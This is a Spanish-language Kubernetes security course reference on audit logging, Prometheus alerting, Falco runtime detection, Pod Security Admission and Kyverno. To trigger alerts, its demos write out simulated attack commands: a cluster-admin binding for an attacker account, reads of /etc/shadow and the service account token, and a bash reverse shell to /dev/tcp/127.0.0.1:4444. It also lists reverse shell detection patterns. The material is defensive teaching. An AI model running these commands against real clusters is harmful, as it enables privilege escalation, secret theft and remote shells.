# Seccion 7 - Monitoring, Logging y Runtime Security en Kubernetes

Referencia de comandos y conceptos extraidos de demos y transcripciones del curso.

## Indice

| Categoria | Demo |
|-----------|------|
| [Audit Logging y Politicas de Auditoria](#audit-logging-y-politicas-de-auditoria) | 01/m1/demo1 |
| [Alertas de Seguridad con Prometheus](#alertas-de-seguridad-con-prometheus) | 01/m1/demo2 |
| [Deteccion de Amenazas en Runtime con Falco](#deteccion-de-amenazas-en-runtime-con-falco) | 02/m2/demo1 |
| [Reglas Personalizadas de Falco y Falcosidekick](#reglas-personalizadas-de-falco-y-falcosidekick) | 02/m2/demo2 |
| [Pod Security Admission (PSA)](#pod-security-admission-psa) | 03/m3/demo1 |
| [Kyverno: Validacion y Mutacion de Pods](#kyverno-validacion-y-mutacion-de-pods) | 03/m3/demo2 |

---

## Audit Logging y Politicas de Auditoria

Conceptos clave:
- El **API Server** captura toda actividad del cluster: autenticacion, autorizacion y cambios de recursos. Por defecto, la mayoria de clusters no tienen audit logging habilitado
- Los niveles de auditoria son: **None** (nada), **Metadata** (solo cabeceras, sin body), **Request** (request sin response), **RequestResponse** (request y response completos)
- Los recursos de alto riesgo deben auditarse a nivel **RequestResponse**: RBAC (clusterrolebindings, rolebindings, clusterroles), operaciones exec/attach/portforward en pods
- Los **secrets** se auditan a nivel **Metadata**: registra quien accedio y cuando, sin capturar el valor del secreto
- Los logs del API Server se escriben en el nodo de control plane; usar **Fluent Bit** para recolectarlos, filtrarlos y enviarlos a almacenamiento externo (Loki, Elasticsearch)
- Un **log-reader pod** con `hostPath` al directorio de logs del nodo permite inspeccionar los archivos de auditoria sin acceso SSH al nodo

```bash
# Desplegar el pod lector de logs del nodo de control plane
kubectl apply -f log-reader.yaml
kubectl wait --for=condition=Ready pod/log-reader -n kube-system --timeout=60s

# Verificar que hay un archivo de auditoria en el nodo
kubectl exec -n kube-system log-reader -- ls -la /var/log/kubernetes/audit/

# Ver el contenido del log de auditoria (vacio si no hay politica habilitada)
kubectl exec -n kube-system log-reader -- cat /var/log/kubernetes/audit/audit.log

# Ver los ultimos eventos de auditoria en formato resumido
kubectl exec -n kube-system log-reader -- tail -5 /var/log/kubernetes/audit/audit.log | jq -r '[.verb, .objectRef.resource] | @tsv'

# Habilitar la politica de auditoria de seguridad (en k3d)
./enable-audit.ps1

# Desplegar Fluent Bit para recolectar y filtrar los logs de auditoria
helm install fluent-bit ./charts/fluent-bit-0.49.0.tgz \
  -f fluent-bit-config.yaml \
  -f fluent-bit-values.yaml \
  --namespace logging --create-namespace \
  --wait

kubectl get pods -n logging
kubectl wait --for=condition=Ready pod -l app.kubernetes.io/name=fluent-bit -n logging --timeout=60s

# Simular el ataque del red team: escalada de privilegios, acceso a secretos, exec en pod
kubectl create clusterrolebinding attacker-admin \
  --clusterrole=cluster-admin \
  --user=attacker@example.com

kubectl get secrets -n wiredbrain

kubectl exec -n wiredbrain deploy/wiredbrain-web -- cat /etc/passwd

# Consultar eventos de RBAC en los logs filtrados por Fluent Bit
kubectl exec -n kube-system log-reader -- cat /var/log/kubernetes/audit/filtered.log | \
  jq -r 'select(.objectRef.resource == "clusterrolebindings") | [.verb, .objectRef.resource, .objectRef.name, .user.username] | @tsv'

# Consultar acceso a secrets
kubectl exec -n kube-system log-reader -- cat /var/log/kubernetes/audit/filtered.log | \
  jq -r 'select(.objectRef.resource == "secrets" and .objectRef.namespace == "wiredbrain") | [.verb, .objectRef.resource, .objectRef.namespace, .user.username] | @tsv'

# Consultar operaciones exec en pods
kubectl exec -n kube-system log-reader -- cat /var/log/kubernetes/audit/filtered.log | \
  jq -r 'select(.objectRef.namespace == "wiredbrain" and .objectRef.subresource == "exec") | [.verb, .objectRef.subresource, .objectRef.name, .objectRef.namespace] | @tsv'
```

Ejemplo YAML: [audit-policy.yaml](./01/demos/m1/demo1/audit-policy.yaml), [log-reader.yaml](./01/demos/m1/demo1/log-reader.yaml), [fluent-bit-config.yaml](./01/demos/m1/demo1/fluent-bit-config.yaml)

---

## Alertas de Seguridad con Prometheus

Conceptos clave:
- Fluent Bit puede transformar logs de auditoria en metricas Prometheus usando el filtro **log_to_metrics**, creando contadores etiquetados por verb, resource y subresource
- Las metricas se exponen en el puerto **2021** y Prometheus las scrapeea via **Kubernetes service discovery**
- Las reglas de alerta en PromQL codifican los patrones de ataque del red team:
  - **ClusterAdminBindingCreated**: cualquier creacion de clusterrolebinding (escalada de privilegios)
  - **BulkSecretsAccess**: mas de 3 operaciones `list` en secrets en 5 minutos (enumeracion)
  - **PodExecDetected**: cualquier operacion exec en un pod (acceso interactivo)
- Usar la funcion **increase()** de PromQL sobre ventanas de tiempo para detectar picos de actividad
- El flujo completo: API Server → Audit Log → Fluent Bit (filtro + metricas) → Prometheus (alertas) → AlertManager (notificaciones)

```bash
# Desplegar Fluent Bit con configuracion de metricas
helm upgrade --install fluent-bit ./charts/fluent-bit-0.49.0.tgz \
  -f fluent-bit-values.yaml \
  -f fluent-bit-config.yaml \
  -f fluent-bit-lua.yaml \
  --namespace logging --create-namespace \
  --wait

kubectl get pods -n logging

# Desplegar Prometheus con reglas de seguridad
helm upgrade --install prometheus ./charts/prometheus-27.0.0.tgz \
  -f prometheus-values.yaml \
  -f prometheus-scrape.yaml \
  -f prometheus-alerts.yaml \
  --namespace monitoring --create-namespace \
  --wait

kubectl get pods -n monitoring

# Simular el ataque para disparar las alertas
kubectl create clusterrolebinding attacker-admin \
  --clusterrole=cluster-admin \
  --user=attacker@example.com

kubectl get secrets -A
kubectl get secrets -n wiredbrain
kubectl get secrets -n kube-system
kubectl get secrets -n default

kubectl exec -n wiredbrain deploy/wiredbrain-web -- whoami

# Esperar a que las alertas disparen y verificarlas
./wait-alerts.ps1

curl -s http://localhost:9090/api/v1/alerts | jq '.data.alerts[] | {alertname: .labels.alertname, state: .state}'
```

Ejemplos de PromQL para investigacion:
```promql
# Eventos de creacion de ClusterRoleBinding (escalada de privilegios)
kubernetes_audit_event_count{verb="create",resource="clusterrolebindings"}

# Tasa de operaciones list en secrets (enumeracion)
rate(kubernetes_audit_event_count{verb="list",resource="secrets"}[5m])
```

Ejemplo YAML: [fluent-bit-config.yaml](./01/demos/m1/demo2/fluent-bit-config.yaml), [prometheus-alerts.yaml](./01/demos/m1/demo2/prometheus-alerts.yaml), [prometheus-scrape.yaml](./01/demos/m1/demo2/prometheus-scrape.yaml)

---

## Deteccion de Amenazas en Runtime con Falco

Conceptos clave:
- El **API Server audit log** solo ve peticiones a la API de Kubernetes. Lo que ocurre _dentro_ de un contenedor (procesos, acceso a archivos, conexiones de red) es invisible al API Server
- **Falco** usa **eBPF** (Extended Berkeley Packet Filter) para adjuntar probes al kernel Linux y monitorear system calls de todos los contenedores en tiempo real
- Falco corre como un **DaemonSet privilegiado** en cada nodo para adjuntar probes eBPF al kernel
- El driver **modern_ebpf** no requiere cabeceras del kernel y funciona con cualquier version reciente de Linux
- Reglas por defecto incluyen: lectura de archivos sensibles (`/etc/shadow`, `/etc/sudoers`), conexiones al API Server desde contenedores, busqueda de claves privadas, limpieza de logs
- Cada alerta incluye contexto Kubernetes completo: nombre del pod, namespace, proceso involucrado y archivo accedido
- Los logs de Falco se pueden enviar a **Elasticsearch** via Fluent Bit para busqueda y correlacion

```bash
# Desplegar Falco con driver modern_ebpf
helm install falco ./charts/falco-7.2.0.tgz \
  -f falco-values.yaml \
  --namespace falco --create-namespace \
  --wait --timeout 5m

kubectl get pods -n falco

# Verificar que el pipeline completo esta funcionando (Falco -> Fluent Bit -> Elasticsearch)
./wait-falco.ps1

# Ver la definicion de la regla "Read sensitive file untrusted"
kubectl exec -n falco daemonset/falco -c falco -- \
  cat /etc/falco/falco_rules.yaml | \
  Select-String -Pattern "^- rule: Read sensitive file untrusted" -Context 0,20

# Triggear acceso a archivo sensible (shadow file)
kubectl exec -n wiredbrain deploy/wiredbrain-web -- cat /etc/shadow

# Esperar que la alerta se indexe y consultar en Elasticsearch
./wait-alert.ps1 "sensitive"
curl "http://localhost:9200/falco-alerts/_search?q=rule.keyword:*sensitive*+AND+output_fields.k8smeta.ns.name:wiredbrain&pretty"

# Triggear conexion al API Server desde dentro del contenedor
kubectl exec -n wiredbrain deploy/wiredbrain-web -- \
  sh -c 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); wget -qO- --header "Authorization: Bearer $TOKEN" --no-check-certificate https://kubernetes.default.svc/api/v1/namespaces'

# Consultar alerta de acceso al API Server
./wait-alert.ps1 "K8S API"
curl "http://localhost:9200/falco-alerts/_search?q=rule.keyword:*K8S*API*+AND+output_fields.k8smeta.ns.name:wiredbrain&pretty"

# Triggear busqueda de claves privadas
kubectl exec -n wiredbrain deploy/wiredbrain-web -- find / -name "id_rsa" 2>$null
kubectl exec -n wiredbrain deploy/wiredbrain-web -- grep -r "BEGIN RSA PRIVATE KEY" /etc 2>$null

# Consultar todas las alertas de Falco en Elasticsearch
curl http://localhost:9200/falco-alerts/_search?pretty
```

Ejemplo YAML: [falco-values.yaml](./02/demos/m2/demo1/falco-values.yaml), [fluent-bit-values.yaml](./02/demos/m2/demo1/fluent-bit-values.yaml)

---

## Reglas Personalizadas de Falco y Falcosidekick

Conceptos clave:
- Las reglas de Falco se escriben en YAML con: `rule` (nombre), `condition` (expresion booleana sobre syscalls), `output` (template de alerta), `priority` y `tags`
- Las condiciones usan campos de los eventos: `proc.name`, `proc.cmdline`, `fd.name`, `container.id`, `k8s.ns.name`
- Reglas personalizadas utiles:
  - **Reverse Shell Spawned** (CRITICAL): shell con patrones de redireccion de red (`ncat -e`, `bash -i >&`)
  - **Service Account Token Read** (WARNING): lectura del token en `/var/run/secrets/kubernetes.io/serviceaccount/token`
  - **Crypto Miner Execution**: procesos de mineria conocidos
  - **Package Manager In Container**: instalaciones de paquetes en produccion
- **Falcosidekick**: herramienta companion que recibe alertas de Falco y las reenvía a multiples destinos (Prometheus, Slack, PagerDuty)
- Falcosidekick expone metricas del tipo `falcosecurity_falcosidekick_falco_events_total` en el puerto **2801**
- Reglas de Prometheus para alertas de Falco: **FalcoCriticalAlert**, **ReverseShellDetected**, **SensitiveFileAccess**, **HighFalcoEventRate**

```bash
# Desplegar Falco con reglas personalizadas
helm install falco ./charts/falco-7.2.0.tgz \
  -f falco-values.yaml \
  -f falco-custom-rules.yaml \
  --namespace falco --create-namespace \
  --wait --timeout 5m

kubectl get pods -n falco

# Desplegar Falcosidekick para exponer metricas a Prometheus
helm install falcosidekick ./charts/falcosidekick-0.9.3.tgz \
  -f falcosidekick-values.yaml \
  --namespace falco \
  --wait

# Desplegar Prometheus con reglas de alerta basadas en Falco
helm install prometheus ./charts/prometheus-27.0.0.tgz \
  -f prometheus-values.yaml \
  -f prometheus-scrape.yaml \
  -f prometheus-alerts.yaml \
  --namespace monitoring --create-namespace \
  --wait

kubectl get pods -n monitoring

# Triggear lectura del service account token (regla personalizada)
kubectl exec -n wiredbrain deploy/wiredbrain-web -- cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Triggear acceso repetido a shadow file (para superar umbral de alerta)
1..4 | % { kubectl exec -n wiredbrain deploy/wiredbrain-web -- cat /etc/shadow }

# Crear pod de prueba con bash para simular reverse shell
kubectl run attacker --image=bash:5 -n wiredbrain --restart=Never --command -- sleep 300
kubectl wait --for=condition=Ready pod/attacker -n wiredbrain --timeout=30s

# Triggear patron de reverse shell (conexion falla pero Falco lo detecta)
kubectl exec -n wiredbrain attacker -- bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1 &'

# Ver alertas de Falco filtradas por namespace wiredbrain
kubectl logs -n falco -l app.kubernetes.io/name=falco -c falco --tail=500 | \
  Where-Object { $_ -match "^\{" } | \
  ForEach-Object { $_ | ConvertFrom-Json } | \
  Where-Object { $_.output_fields."k8s.ns.name" -eq "wiredbrain" -and $_.priority -in @("Warning", "Notice", "Critical") } | \
  Select-Object time, rule, priority | \
  Format-Table

# Ver detalle completo de una alerta especifica en JSON
kubectl logs -n falco -l app.kubernetes.io/name=falco -c falco --tail=500 | \
  Where-Object { $_ -match "^\{" } | \
  ForEach-Object { $_ | ConvertFrom-Json } | \
  Where-Object { $_.rule -eq "Service Account Token Read" } | \
  Select-Object -Last 1 | \
  ConvertTo-Json -Depth 5

# Esperar que las alertas de Prometheus disparen
./wait-alert.ps1 -AlertName "FalcoCriticalAlert"

# Verificar metricas de Falcosidekick en Prometheus
curl -s http://localhost:9090/api/v1/query?query=up | jq '.data.result[] | {target: .metric.job, status: .value[1]}'
```

Ejemplo YAML: [falco-custom-rules.yaml](./02/demos/m2/demo2/falco-custom-rules.yaml), [falcosidekick-values.yaml](./02/demos/m2/demo2/falcosidekick-values.yaml), [prometheus-alerts.yaml](./02/demos/m2/demo2/prometheus-alerts.yaml)

---

## Pod Security Admission (PSA)

Conceptos clave:
- **Pod Security Admission** es el mecanismo nativo de Kubernetes para aplicar estandares de seguridad a nivel de namespace mediante labels
- Los tres perfiles son: **Privileged** (sin restricciones), **Baseline** (bloquea configuraciones mas peligrosas: contenedores privilegiados, hostPath), **Restricted** (maxima seguridad: no root, no escalada de privilegios, seccompProfile requerido)
- Los tres modos de PSA son: **enforce** (rechaza pods no conformes), **audit** (registra en audit log sin rechazar), **warn** (muestra advertencia al usuario)
- Un **contenedor privilegiado** (`privileged: true`) tiene acceso completo al host: puede ver procesos, acceder al sistema de archivos del nodo y cargar modulos del kernel
- Un **hostPath mount** rompe el aislamiento de contenedor al montar directorios del nodo directamente
- PSA solo evalua pods en **creacion y actualizacion**; no evicta pods existentes. Seguro aplicar a namespaces con workloads activos
- Las apps de terceros que requieren root o hostPath necesitan un namespace separado con politica **Privileged** y acceso RBAC restringido

```bash
# Ver labels de PSA en el namespace
kubectl get ns wiredbrain --show-labels

# Aplicar politica Baseline al namespace (bloquea configs peligrosas, advierte Restricted)
kubectl apply -f namespaces/baseline-namespace.yaml

# Intentar desplegar contenedor privilegiado (bloqueado por Baseline)
kubectl apply -f pods/privileged-pod.yaml -n wiredbrain

# Intentar desplegar pod con hostPath mount (bloqueado por Baseline)
kubectl apply -f pods/hostpath-pod.yaml -n wiredbrain

# Desplegar pod conforme (funciona correctamente)
kubectl apply -f pods/compliant-pod.yaml -n wiredbrain
kubectl get pod compliant-app -n wiredbrain

# Actualizar a politica Restricted (maxima seguridad)
kubectl apply -f namespaces/restricted-namespace.yaml

# Intentar desplegar pod corriendo como root (bloqueado por Restricted)
kubectl apply -f pods/root-pod.yaml -n wiredbrain

# Usar audit mode para identificar violaciones sin bloquear (util para migracion)
kubectl apply -f namespaces/audit-namespace.yaml
kubectl apply -f pods/root-pod.yaml -n audit-test
kubectl get pod attacker-root -n audit-test
kubectl delete ns audit-test --force

# Crear namespace separado para apps de terceros que requieren mas privilegios
kubectl apply -f namespaces/vendor-namespace.yaml
kubectl apply -f pods/vendor-backup-pod.yaml -n vendor-backup
kubectl get pod vendor-backup-agent -n vendor-backup

# Verificar que los pods existentes continuan corriendo (PSA no evicta)
kubectl get pods -n wiredbrain
```

Ejemplo YAML: [namespaces/baseline-namespace.yaml](./03/demos/m3/demo1/namespaces/baseline-namespace.yaml), [namespaces/restricted-namespace.yaml](./03/demos/m3/demo1/namespaces/restricted-namespace.yaml), [pods/compliant-pod.yaml](./03/demos/m3/demo1/pods/compliant-pod.yaml)

---

## Kyverno: Validacion y Mutacion de Pods

Conceptos clave:
- **Kyverno** es un admission controller que intercepta requests a la API antes de que se creen los recursos, con capacidad de **validar** (rechazar) y **mutar** (modificar) pods
- **ClusterPolicy** con regla `validate`: verifica que el campo `seccompProfile.type` este configurado (`RuntimeDefault` o `Localhost`). Rechaza pods sin perfil seccomp
- **ClusterPolicy** con regla `mutate`: usa el prefijo `+(seccompProfile)` para _agregar_ el perfil si no esta presente. No sobreescribe configuracion existente
- **Seccomp** (Secure Computing Mode): tecnologia Linux que filtra system calls peligrosas a nivel kernel. Modo 2 = filtro activo, modo 0 = sin restricciones
- `RuntimeDefault` bloquea syscalls peligrosas usadas en escapes de contenedores (ej: `unshare`) sin afectar el comportamiento normal de la aplicacion
- Kyverno tiene cuatro controladores: **admission** (validacion/mutacion en tiempo real), **background** (verificacion de recursos existentes), **cleanup** (recursos expirados), **reports** (visibilidad de compliance)
- El orden de Kyverno es: mutacion primero, luego validacion. Un pod sin seccomp es mutado para agregarlo, luego pasa la validacion

```bash
# Desplegar Kyverno como admission controller
helm install kyverno ./charts/kyverno-3.6.2.tgz \
  -f kyverno-values.yaml \
  --namespace kyverno --create-namespace \
  --wait --timeout 5m

kubectl get pods -n kyverno

# Aplicar politica de validacion: requiere seccompProfile
kubectl apply -f policies/require-seccomp.yaml
kubectl get clusterpolicy require-seccomp-profile

# Probar que un pod sin seccomp es rechazado
kubectl apply -f pods/no-seccomp.yaml

# Aplicar politica de mutacion: inyectar seccompProfile si no esta presente
kubectl apply -f policies/mutate-seccomp.yaml

# Ahora el mismo pod es admitido (Kyverno lo muta antes de validarlo)
kubectl apply -f pods/no-seccomp.yaml
kubectl get pod test-no-seccomp -n wiredbrain

# Verificar que Kyverno inyecto el seccompProfile
kubectl get pod test-no-seccomp -n wiredbrain \
  -o custom-columns="NAME:.metadata.name,SECCOMP:.spec.containers[0].securityContext.seccompProfile.type"

# Verificar que seccomp esta activo en el kernel (Seccomp: 2 = filtro activo)
kubectl exec test-no-seccomp -n wiredbrain -- grep Seccomp /proc/1/status

# Verificar que syscalls peligrosas estan bloqueadas
kubectl exec test-no-seccomp -n wiredbrain -- unshare -r whoami

# Verificar que la aplicacion normal funciona sin restricciones
kubectl exec test-no-seccomp -n wiredbrain -- whoami
kubectl exec test-no-seccomp -n wiredbrain -- ls /

# Verificar pods existentes que aun no tienen seccomp (anterior a la politica)
kubectl exec deploy/wiredbrain-web -n wiredbrain -- grep Seccomp /proc/1/status

# Reiniciar el deployment para que los nuevos pods pasen por Kyverno
kubectl rollout restart deployment/wiredbrain-web -n wiredbrain
kubectl rollout status deployment/wiredbrain-web -n wiredbrain

# Confirmar que los pods renovados tienen seccomp activo
kubectl exec deploy/wiredbrain-web -n wiredbrain -- grep Seccomp /proc/1/status
```

Ejemplo YAML: [policies/require-seccomp.yaml](./03/demos/m3/demo2/policies/require-seccomp.yaml), [policies/mutate-seccomp.yaml](./03/demos/m3/demo2/policies/mutate-seccomp.yaml)
